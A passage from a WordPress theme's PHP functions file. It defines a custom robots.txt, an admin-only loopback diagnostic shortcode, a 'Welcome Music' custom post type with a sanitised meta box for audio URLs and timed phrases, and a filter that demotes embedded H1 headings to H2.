   ============================================================ */
function zk_custom_robots_txt( $output, $public ) {
    $site_url = untrailingslashit( home_url() );
    
    $custom_robots  = "User-agent: *\n";
    $custom_robots .= "Allow: /\n";
    $custom_robots .= "Disallow: /wp-admin/\n";
    $custom_robots .= "Allow: /wp-admin/admin-ajax.php\n";
    $custom_robots .= "Disallow: /wp-json/\n";
    $custom_robots .= "Disallow: /*?replytocom=\n";
    $custom_robots .= "Disallow: /*?s=\n";
    $custom_robots .= "Disallow: /*/feed/\n\n";
    $custom_robots .= "Sitemap: " . esc_url( $site_url ) . "/wp-sitemap.xml\n";
    
    return $custom_robots;
}
add_filter( 'robots_txt', 'zk_custom_robots_txt', 99, 2 );

// Remove default WordPress canonical tag to prevent conflicts with ZK Custom SEO Engine
remove_action( 'wp_head', 'rel_canonical' );

/* ============================================================
   DIAGNOSTIC - LOOPBACK TEST SHORTCODE
   ============================================================ */
function zk_loopback_diagnostic_shortcode() {
    if ( ! current_user_can('manage_options') ) {
        return 'Unauthorized. Must be admin.';
    }

    $url = rest_url( 'wp/v2/types/post?context=edit' );
    $start_time = microtime(true);
    
    $cookies = array();
    foreach ( $_COOKIE as $name => $value ) {
        $cookies[] = new WP_Http_Cookie( array( 'name' => $name, 'value' => $value ) );
    }
    
    $args = array(
        'timeout'   => 15,
        'sslverify' => false,
        'cookies'   => $cookies,
    );
    
    $response = wp_remote_get( $url, $args );
    $end_time = microtime(true);
    $duration = round( $end_time - $start_time, 2 );

    $output = '<div style="background:#111; color:#0f0; padding:20px; font-family:monospace; margin:20px 0; border-radius:8px; border:1px solid #333;">';
    $output .= '<h3 style="color:#0f0; margin-top:0;">Loopback Diagnostic Test</h3>';
    $output .= '<p><strong>Testing URL:</strong> ' . esc_html($url) . '</p>';
    $output .= '<p><strong>Time Taken:</strong> ' . $duration . ' seconds</p>';

    if ( is_wp_error( $response ) ) {
        $output .= '<p style="color:#f55;"><strong>Error:</strong> ' . esc_html( $response->get_error_message() ) . '</p>';
    } else {
        $code = wp_remote_retrieve_response_code( $response );
        $headers = wp_remote_retrieve_headers( $response );
        
        $output .= '<p><strong>Response Code:</strong> ' . esc_html( $code ) . '</p>';
        $output .= '<h4>Headers:</h4><pre style="white-space:pre-wrap; overflow-x:auto; background:#000; padding:10px; border-radius:4px;">';
        foreach ( $headers as $key => $value ) {
            if ( is_array($value) ) {
                $value = implode(', ', $value);
            }
            $output .= esc_html($key) . ': ' . esc_html($value) . "\n";
        }
        $output .= '</pre>';
    }
    
    $output .= '</div>';
    
    return $output;
}
add_shortcode('zk_loopback_test', 'zk_loopback_diagnostic_shortcode');

/* -------------------------------------------------------------------------
   WELCOME MUSIC CPT
   ------------------------------------------------------------------------- */
function zk_register_welcome_music_cpt() {
    $labels = array(
        'name'          => 'Welcome Music',
        'singular_name' => 'Welcome Music',
        'menu_name'     => 'Welcome Music',
        'add_new'       => 'Add New Track',
        'edit_item'     => 'Edit Track',
    );
    $args = array(
        'labels'        => $labels,
        'public'        => false,
        'show_ui'       => true,
        'menu_icon'     => 'dashicons-controls-volumeon',
        'supports'      => array( 'title', 'thumbnail' ),
    );
    register_post_type( 'zk_welcome_music', $args );
}
add_action( 'init', 'zk_register_welcome_music_cpt' );

function zk_welcome_music_add_meta_box() {
    add_meta_box( 'zk_welcome_music_details', 'Music Details', 'zk_welcome_music_meta_callback', 'zk_welcome_music', 'normal', 'high' );
}
add_action( 'add_meta_boxes', 'zk_welcome_music_add_meta_box' );

function zk_welcome_music_meta_callback( $post ) {
    wp_nonce_field( 'zk_welcome_music_save_meta', 'zk_welcome_music_meta_nonce' );
    $audio_url   = get_post_meta( $post->ID, '_zk_welcome_music_url', true );
    $tooltip     = get_post_meta( $post->ID, '_zk_welcome_music_tooltip', true );
    $tooltip_ka  = get_post_meta( $post->ID, '_zk_welcome_music_tooltip_ka', true );
    $phrases     = get_post_meta( $post->ID, '_zk_welcome_music_phrases', true );
    ?>
    <style>
        .zk-meta-row { margin-bottom: 15px; }
        .zk-meta-row label { display: block; font-weight: bold; margin-bottom: 5px; }
        .zk-meta-row input[type="text"], .zk-meta-row textarea { width: 100%; max-width: 600px; padding: 8px; }
    </style>
    <div class="zk-meta-row">
        <label for="zk_welcome_music_url">Audio File URL (Upload to Media and paste URL here):</label>
        <input type="text" id="zk_welcome_music_url" name="zk_welcome_music_url" value="<?php echo esc_attr( $audio_url ); ?>" />
    </div>
    <div class="zk-meta-row">
        <label for="zk_welcome_music_tooltip">Tooltip Text (Optional custom message on hover):</label>
        <input type="text" id="zk_welcome_music_tooltip" name="zk_welcome_music_tooltip" value="<?php echo esc_attr( $tooltip ); ?>" />
    </div>
    <div class="zk-meta-row">
        <label for="zk_welcome_music_tooltip_ka">ქართული Tooltip ტექსტი (Georgian Tooltip Text):</label>
        <input type="text" id="zk_welcome_music_tooltip_ka" name="zk_welcome_music_tooltip_ka" value="<?php echo esc_attr( $tooltip_ka ); ?>" placeholder="მაგ. ვფიქრობდი ჩემი ზოგიერთი ძველი, წაშლილი მუსიკის..." />
    </div>
    <div class="zk-meta-row">
        <label for="zk_welcome_music_phrases" style="margin-bottom:10px; display:inline-block;">Cinematic Phrases (Synced with audio):</label>
        <?php 
        wp_editor( $phrases, 'zk_welcome_music_phrases', array(
            'textarea_name' => 'zk_welcome_music_phrases',
            'textarea_rows' => 8,
            'media_buttons' => false,
            'teeny'         => false
        ) ); 
        ?>
        <p class="description" style="margin-top:10px;">
            Synchronize phrases with the music by prepending timestamps: <strong>[MM:SS-MM:SS] Your text here</strong><br>
            Example: <code>[00:15-00:25] Welcome to the universe</code><br>
            Each timestamped phrase should be on a new line. You can use Bold and Italic formatting.
        </p>
    </div>
    <?php
}

function zk_welcome_music_save_meta( $post_id ) {
    if ( ! isset( $_POST['zk_welcome_music_meta_nonce'] ) ) return;
    if ( ! wp_verify_nonce( $_POST['zk_welcome_music_meta_nonce'], 'zk_welcome_music_save_meta' ) ) return;
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return;
    if ( ! current_user_can( 'edit_post', $post_id ) ) return;

    if ( isset( $_POST['zk_welcome_music_url'] ) ) {
        update_post_meta( $post_id, '_zk_welcome_music_url', sanitize_text_field( $_POST['zk_welcome_music_url'] ) );
    }
    if ( isset( $_POST['zk_welcome_music_tooltip'] ) ) {
        update_post_meta( $post_id, '_zk_welcome_music_tooltip', sanitize_text_field( $_POST['zk_welcome_music_tooltip'] ) );
    }
    if ( isset( $_POST['zk_welcome_music_tooltip_ka'] ) ) {
        update_post_meta( $post_id, '_zk_welcome_music_tooltip_ka', sanitize_text_field( $_POST['zk_welcome_music_tooltip_ka'] ) );
    }
    if ( isset( $_POST['zk_welcome_music_phrases'] ) ) {
        update_post_meta( $post_id, '_zk_welcome_music_phrases', wp_kses_post( $_POST['zk_welcome_music_phrases'] ) );
    }
}
add_action( 'save_post', 'zk_welcome_music_save_meta' );

require_once get_template_directory() . '/inc/zk-indexing-api.php';
require_once get_template_directory() . '/inc/book-seo-cache.php';

/**
 * The theme supplies the page's single primary H1. Rich editor content and
 * shortcodes occasionally contain additional H1 elements; keep their text and
 * attributes while placing them at the correct section-heading level.
 */
function zk_normalize_embedded_content_headings( $content ) {
    if ( is_admin() || ! is_singular() || is_feed() ) {
        return $content;
    }

    $content = preg_replace( '/<h1(\s[^>]*)?>/i', '<h2$1>', (string) $content );
    return preg_replace( '/<\/h1>/i', '</h2>', $content );
}
add_filter( 'the_content', 'zk_normalize_embedded_content_headings', 99 );
